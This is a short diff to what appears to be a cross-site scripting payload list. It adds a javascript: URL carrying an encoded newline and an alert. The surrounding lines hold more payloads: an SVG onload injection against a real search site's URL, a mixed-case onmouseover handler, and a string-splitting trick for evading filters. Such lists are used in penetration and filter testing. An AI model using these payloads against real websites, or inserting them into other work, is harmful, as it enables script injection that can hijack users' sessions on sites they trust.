@@ -1,5 +1,8 @@
 URL ##
 
+
+
+JavaScript:https://<YourDomain>#%0aalert('xss')
 /7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.location)%3E
 OnMoUsEoVeR=prompt(/hacked/)//
 <Svg/Onload=top%5B"al"%2B"ert%5D(1)//
